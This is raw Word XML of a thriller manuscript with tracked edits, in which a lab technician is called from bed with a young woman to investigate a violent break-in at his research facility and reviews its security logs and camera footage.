        </w:r>
      </w:ins>
      <w:del w:id="2381" w:author="TextVet" w:date="2016-03-23T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA0ADF">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her arms high over her head in a </w:t>
      </w:r>
      <w:ins w:id="2382" w:author="TextVet" w:date="2016-03-23T15:10:00Z">
        <w:r w:rsidR="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>near-theatrical</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2383" w:author="TextVet" w:date="2016-03-23T15:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>wide, waking</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stretch. Her big, innocent eyes fluttered open and groggily came to focus on him. “Mmmm… Good morning.”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moved his head down to flick her nipple with his tongue.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girl’s fingers ran along his shoulder and down his chest, and she rolled to press gently against him with the full length of her feather-soft body. Roger grabbed her head in both hands and kissed her hard. She rubbed her thigh against his hip, her instep brushing against his calf. He shifted his weight, ready to climb on top of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buzzing burst out once more.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“Fuuuuu</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uuuuuck</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” Roger reluctantly rolled himself off the gorgeous blonde and peered over the edge of the bed, looking for his cellphone. He pressed “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”. “What’s up, Doc?” h</w:t>
      </w:r>
      <w:ins w:id="2384" w:author="TextVet" w:date="2016-03-23T15:16:00Z">
        <w:r w:rsidR="00A23746">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>is phlegm-</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2385" w:author="TextVet" w:date="2016-03-23T15:17:00Z">
        <w:r w:rsidR="00D10095">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>laden</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2386" w:author="TextVet" w:date="2016-03-23T15:16:00Z">
        <w:r w:rsidR="00A23746">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> voice</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2387" w:author="TextVet" w:date="2016-03-23T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A23746">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">e </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2388" w:author="TextVet" w:date="2016-03-23T15:15:00Z">
        <w:r w:rsidR="00A23746">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> grumbled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2389" w:author="TextVet" w:date="2016-03-23T15:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0013011C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said groggily</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2390" w:author="TextVet" w:date="2016-03-23T15:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A23746">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> into the phone</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old Russian scientist’s voice rattled from the speaker.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replied, “I was going to be in at 9:30, like usual. It’s barely eight o’clock. What’s going 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phone mumbled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Roger asked. “No, I haven’t seen her since work yesterday. Why?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00FD4F86" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:del w:id="2391" w:author="TextVet" w:date="2016-03-23T15:14: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More Russian-accented mumbling</w:t>
      </w:r>
      <w:ins w:id="2392" w:author="TextVet" w:date="2016-03-23T15:14:00Z">
        <w:r w:rsidR="00FD4F86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> made </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2393" w:author="TextVet" w:date="2016-03-23T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD4F86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>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w:t>
      </w:r>
      <w:del w:id="2394" w:author="TextVet" w:date="2016-03-23T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD4F86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>’s body suddenly went</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2395" w:author="TextVet" w:date="2016-03-23T15:14:00Z">
        <w:r w:rsidR="00FD4F86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> freeze</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2396" w:author="TextVet" w:date="2016-03-23T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD4F86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> tense</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “What? What do you mean, ‘break-in’?” He reached for the blanket and pulled it around himself absentmindedly, quickly losing his arousal. The girl looked on uncertainly.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Passinsky’s gruff voice murmured a few sentences.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bolted upright. “Whoa! Whoa, Doctor P., slow down… What happened?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00A13DDD" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2397" w:author="TextVet" w:date="2016-03-23T15:19:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Passinsky persist</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2398" w:author="TextVet" w:date="2016-03-23T15:19:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00A13DDD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>The old Russian’s voice continu</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w: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his free hand,</w:t>
      </w:r>
      <w:ins w:id="2399" w:author="TextVet" w:date="2016-03-23T15:19:00Z">
        <w:r w:rsidR="005C6293">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2400" w:author="TextVet" w:date="2016-03-23T15:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005C6293">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Roger fumbled around on the floor. “Hold on, Doc. Let me get my Bluetooth…” He found his headset and popped it into his ear. He pulled out a spare pair of glasses and a laptop. He wrapped himself in the blanket, sat cross-legged on the bed, and began typing.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girl pawed at him. “Is everything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batted her away. “Not now, Carrie.”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“My name’s Kelly!”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Staring at the screen, he said , “Okay, the DenyHosts log does say that someone was trying to hack in yesterday, but the attempt failed. The keycard server shows activity last night by… Julie? And… Fuck! The cameras!” He slapped his laptop closed, and shot up from the bed to dig through the piles of clothes on his floor. “Doctor P., I’m on my way.” A quick tap to the earpiece ended the conversation. Roger gave himself a rub of deodorant and a quick spray of Axe, and wiggled into boxers and a </w:t>
      </w:r>
      <w:ins w:id="2401" w:author="TextVet" w:date="2016-03-23T15:21:00Z">
        <w:r w:rsidR="00B67446">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2402" w:author="TextVet" w:date="2016-03-23T15:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B67446">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-shirt.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girl sat on the bed, </w:t>
      </w:r>
      <w:ins w:id="2403" w:author="TextVet" w:date="2016-03-23T15:21:00Z">
        <w:r w:rsidR="00774C38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>d</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2404" w:author="TextVet" w:date="2016-03-23T15:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00774C38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">putting </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:ins w:id="2405" w:author="TextVet" w:date="2016-03-23T15:21:00Z">
        <w:r w:rsidR="00774C38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>n</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:ins w:id="2406" w:author="TextVet" w:date="2016-03-23T15:21:00Z">
        <w:r w:rsidR="00774C38">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her bra and scanning the studio apartment for the rest of her clothes. “What’s going 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“You should get going,” </w:t>
      </w:r>
      <w:del w:id="2407" w:author="TextVet" w:date="2016-03-23T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AA79A7">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 xml:space="preserve">Roger </w:t>
      </w:r>
      <w:ins w:id="2408" w:author="TextVet" w:date="2016-03-23T15:22:00Z">
        <w:r w:rsidR="00AA79A7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">half-snapped </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>without looking at her. His motorcycle jacket lay slung over a chair near his helmet and boots. He began to climb into his riding gear.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you give me a ride to class?”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zipped up his jacket and, holding his helmet under one arm, headed back to the bed. He gave her a quick meaningless kiss, and fished his wallet out of his pants.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“Here,” he said, and slipped her a twenty.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stared at the bill. “What the hell is this?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2409" w:author="TextVet" w:date="2016-03-23T15:23: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“Cab fare,” Roger answered, and headed for the door.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B7753" w:rsidRPr="000D3488" w:rsidRDefault="008B7753" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Scientists scurried through</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the battle-scarred hallways, checking on projects and assessing damage to equipment. Tina’s green Volkswag</w:t>
      </w:r>
      <w:ins w:id="2410" w:author="TextVet" w:date="2016-03-23T15:24:00Z">
        <w:r w:rsidR="004B472C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2411" w:author="TextVet" w:date="2016-03-23T15:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004B472C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n Jetta was still in the parking lot</w:t>
      </w:r>
      <w:del w:id="2412" w:author="TextVet" w:date="2016-03-23T15:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004901C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> outside</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, its windows smashed and glove compartment ransacked. The reception desk had been overturned, the stockroom had sustained a rampage, and bullet holes pocked the gypsum walls everywhere. A few bloody streaks on the walls and carpet had left crusty reddish-brown stains. Roger had walked through the building feeling like he was watching a documentary about Sarajevo or Fallujah. The sensation didn’t seem real.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scientists were mostly men and women in their forties and fifties, each with multiple technical degrees. Their educated faces </w:t>
      </w:r>
      <w:del w:id="2413" w:author="TextVet" w:date="2016-03-23T15:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A1E6E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>reacted with</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2414" w:author="TextVet" w:date="2016-03-23T15:25:00Z">
        <w:r w:rsidR="008A1E6E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>frowned</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> confusion and </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>outrage at the idea of their ivory tower</w:t>
      </w:r>
      <w:ins w:id="2415" w:author="TextVet" w:date="2016-03-23T15:26:00Z">
        <w:r w:rsidR="005F2737">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 xml:space="preserve"> being defiled by such real-world vulgarities as physical violence. He was surprised to see so many of the researchers at such an early hour — apparently Doctor P., usually the first to arrive in the office anyway, had spent the morning on the phone.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D33BF" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2416" w:author="TextVet" w:date="2016-03-23T15:32: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Doctor P. was still on that phone</w:t>
      </w:r>
      <w:r w:rsidR="009968C4">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> wh</w:t>
      </w:r>
      <w:r w:rsidR="009968C4">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ile</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Roger access</w:t>
      </w:r>
      <w:r w:rsidR="009968C4">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the DVR that recorded the camera feeds. Roger sat in Passinsky’s chair and operated his computer</w:t>
      </w:r>
      <w:r w:rsidR="009968C4">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Passinsky remained standing, speaking rapidly into his cellphone in Russian.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Finally</w:t>
      </w:r>
      <w:ins w:id="2417" w:author="TextVet" w:date="2016-03-23T15:29:00Z">
        <w:r w:rsidR="00974804">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Passinsky hung up</w:t>
      </w:r>
      <w:ins w:id="2418" w:author="TextVet" w:date="2016-03-23T15:29:00Z">
        <w:r w:rsidR="009D3F9B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2419" w:author="TextVet" w:date="2016-03-23T15:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009D3F9B">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turn</w:t>
      </w:r>
      <w:ins w:id="2420" w:author="TextVet" w:date="2016-03-23T15:31:00Z">
        <w:r w:rsidR="009968C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2421" w:author="TextVet" w:date="2016-03-23T15:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009968C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed to Roger</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “So what do you think?”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“I’m still trying to wrap my brain around this, Dr. P.” </w:t>
      </w:r>
      <w:r w:rsidR="00BB7030">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Roger indicated the</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> back feeds </w:t>
      </w:r>
      <w:ins w:id="2422" w:author="TextVet" w:date="2016-03-23T15:33:00Z">
        <w:r w:rsidR="00BB7030">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">he was playing </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
